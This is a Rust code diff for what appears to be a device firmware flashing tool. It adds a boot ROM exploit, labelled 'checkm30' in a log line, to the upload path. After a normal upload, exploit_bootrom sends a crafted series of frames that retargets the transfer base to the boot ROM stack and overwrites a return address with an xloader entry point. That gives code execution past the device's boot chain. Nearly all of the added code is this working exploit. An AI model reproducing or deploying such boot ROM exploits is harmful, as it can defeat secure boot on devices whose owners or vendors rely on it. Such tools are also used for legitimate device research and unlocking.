@@ -5,6 +5,12 @@ use crate::crc::crc16_hqx_be;
 use crate::error::Error;
 use crate::transport::Transport;
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct ExploitParams {
+    pub xloader_entry: u32,
+    pub return_address: u32,
+}
+
 pub const START_FRAME: [u8; 14] = [
     0xFE, 0x00, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x02, 0x01, 0x1D, 0x0F,
 ];
@@ -115,5 +121,53 @@ pub fn upload(
 
     write_and_verify(transport, &tail_command(((seq + 1) & 0xFF) as u8), log)?;
     thread::sleep(Duration::from_millis(500));
+    Ok(())
+}
+
+pub fn upload_with_exploit(
+    transport: &mut dyn Transport,
+    data: &[u8],
+    address: u32,
+    params: ExploitParams,
+    log: &mut dyn FnMut(&str),
+    progress: &mut dyn FnMut(u64, u64),
+) -> Result<(), Error> {
+    let length = checked_upload_length(address, data.len())?;
+    write_and_verify(transport, &head_command(address, length), log)?;
+
+    let mut seq: u64 = 0;
+    let mut sent: u64 = 0;
+    for chunk in data.chunks(MAX_DATA_LEN) {
+        seq += 1;
+        write_and_verify(transport, &data_command((seq & 0xFF) as u8, chunk), log)?;
+        sent += chunk.len() as u64;
+        progress(sent, data.len() as u64);
+    }
+
+    log("  checkm30: retargeting transfer base to the boot ROM stack");
+    exploit_bootrom(transport, params, address, log)?;
+    thread::sleep(Duration::from_millis(500));
+    Ok(())
+}
+
+fn exploit_bootrom(
+    transport: &mut dyn Transport,
+    params: ExploitParams,
+    address: u32,
+    log: &mut dyn FnMut(&str),
+) -> Result<(), Error> {
+    write_and_verify(transport, &head_command(address, 4), log)?;
+    thread::sleep(Duration::from_millis(100));
+    transport.write_all(&head_command(params.return_address, 4), ACK_TIMEOUT)?;
+    thread::sleep(Duration::from_millis(100));
+    transport.discard_input();
+    write_and_verify(
+        transport,
+        &data_command(1, &params.xloader_entry.to_le_bytes()),
+        log,
+    )?;
+    thread::sleep(Duration::from_millis(10));
+    transport.write_all(&tail_command(2), ACK_TIMEOUT)?;
+    thread::sleep(Duration::from_millis(100));
     Ok(())
 }
